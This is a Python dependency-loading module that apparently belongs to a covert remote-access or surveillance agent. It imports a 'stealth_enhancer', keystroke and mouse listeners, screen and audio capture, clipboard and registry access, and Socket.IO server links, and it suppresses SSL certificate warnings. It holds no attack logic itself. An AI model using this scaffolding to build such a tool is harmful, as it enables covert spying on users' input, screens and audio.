"""
Dependency management module
Handles importing and checking availability of all third-party libraries
"""

import warnings

# Fix eventlet issue by patching BEFORE any other imports
try:
    import eventlet
    # More comprehensive monkey patching to fix RLock issues
    eventlet.monkey_patch(all=True, thread=True, time=True)
    
    # Additional fix for RLock greening issues in newer Python versions
    import threading
    if hasattr(threading, '_RLock'):
        threading._RLock = eventlet.green.threading.RLock
    if hasattr(threading, 'RLock'):
        threading.RLock = eventlet.green.threading.RLock
        
except ImportError:
    pass  # eventlet not available, continue without it

# Stealth enhancer integration (gated)
try:
    from stealth_enhancer import *
    STEALTH_AVAILABLE = True
except ImportError:
    STEALTH_AVAILABLE = False

# Standard library imports
import time
import urllib3
import uuid
import os
import subprocess
import threading
import sys
import random
import base64
import tempfile
import io
import wave
import socket
import json
import asyncio
import platform
from collections import defaultdict
import queue
import math
import smtplib
from email.mime.text import MIMEText
import hashlib

# HTTP requests (used as fallback)
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

# Third-party imports with error handling
try:
    import mss
    MSS_AVAILABLE = True
except ImportError:
    MSS_AVAILABLE = False

try:
    import numpy as np
    NUMPY_AVAILABLE = True
except ImportError:
    NUMPY_AVAILABLE = False

try:
    import cv2
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False

# Windows-specific imports
try:
    import win32api
    import win32con
    import win32clipboard
    import win32security
    import win32process
    import win32event
    import ctypes
    from ctypes import wintypes
    import winreg
    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False
    
# Audio processing imports
try:
    import pyaudio
    PYAUDIO_AVAILABLE = True
    FORMAT = pyaudio.paInt16
except ImportError:
    PYAUDIO_AVAILABLE = False
    FORMAT = None

# Input handling imports
try:
    import pynput
    from pynput import keyboard, mouse
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

# GUI and graphics imports
try:
    with warnings.catch_warnings():
        warnings.filterwarnings("ignore", category=UserWarning, module="pygame.pkgdata")
        import pygame
    PYGAME_AVAILABLE = True
except ImportError:
    PYGAME_AVAILABLE = False

# WebSocket imports
try:
    import websockets
    WEBSOCKETS_AVAILABLE = True
except ImportError:
    WEBSOCKETS_AVAILABLE = False

# Speech recognition imports
try:
    import speech_recognition as sr
    SPEECH_RECOGNITION_AVAILABLE = True
except ImportError:
    SPEECH_RECOGNITION_AVAILABLE = False

# System monitoring imports
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

# Image processing imports
try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

# GUI automation imports
try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    PYAUTOGUI_AVAILABLE = False

# Socket.IO imports
try:
    import socketio
    SOCKETIO_AVAILABLE = True
except ImportError:
    SOCKETIO_AVAILABLE = False

# WebRTC imports for low-latency streaming
try:
    import aiortc
    from aiortc import RTCPeerConnection, MediaStreamTrack, RTCSessionDescription
    from aiortc.contrib.media import MediaRecorder, MediaPlayer, MediaRelay
    from aiortc.mediastreams import MediaStreamError
    import av
    AIORTC_AVAILABLE = True
except ImportError:
    AIORTC_AVAILABLE = False

# Additional WebRTC dependencies
try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False

try:
    import aiortc.contrib.signaling
    AIORTC_SIGNALING_AVAILABLE = True
except ImportError:
    AIORTC_SIGNALING_AVAILABLE = False

def handle_missing_dependency(module_name, feature_description, alternative=None):
    """
    Gracefully handle missing dependencies by:
    1. Logging the issue silently
    2. Providing fallback functionality where possible
    3. Continuing operation without crashing
    """
    print(f"{module_name} not available, {feature_description} may not work")
    if alternative:
        print(f"Using alternative: {alternative}")
    return False

def safe_import(module_name, feature_description=""):
    """
    Safely import a module and return True if successful, False otherwise
    """
    try:
        __import__(module_name)
        return True
    except ImportError:
        handle_missing_dependency(module_name, feature_description)
        return False

def check_system_requirements():
    """
    Check system requirements and provide graceful fallbacks for missing dependencies
    """
    print("Checking system requirements...")
    
    requirements = {
        'Windows': WINDOWS_AVAILABLE,
        'Socket.IO': SOCKETIO_AVAILABLE,
        'psutil': PSUTIL_AVAILABLE,
        'requests': REQUESTS_AVAILABLE,
    }
    
    optional_features = {
        'Screen capture': MSS_AVAILABLE,
        'Audio processing': PYAUDIO_AVAILABLE,
        'Image processing': PIL_AVAILABLE,
        'GUI automation': PYAUTOGUI_AVAILABLE,
        'Input monitoring': PYNPUT_AVAILABLE,
        'OpenCV': CV2_AVAILABLE,
        'NumPy': NUMPY_AVAILABLE,
        'Speech recognition': SPEECH_RECOGNITION_AVAILABLE,
        'WebSockets': WEBSOCKETS_AVAILABLE,
        'Pygame': PYGAME_AVAILABLE,
    }
    
    # Check critical requirements
    missing_critical = [name for name, available in requirements.items() if not available]
    if missing_critical:
        print(f"Critical dependencies missing: {', '.join(missing_critical)}")
        if not SOCKETIO_AVAILABLE:
            print("Socket.IO unavailable - server communication disabled")
    else:
        print("All critical requirements satisfied")
    
    # Log optional feature status
    missing_optional = [name for name, available in optional_features.items() if not available]
    if missing_optional:
        print(f"Optional features unavailable: {', '.join(missing_optional)}")
    
    available_optional = [name for name, available in optional_features.items() if available]
    if available_optional:
        print(f"Optional features available: {', '.join(available_optional)}")
    
    return len(missing_critical) == 0
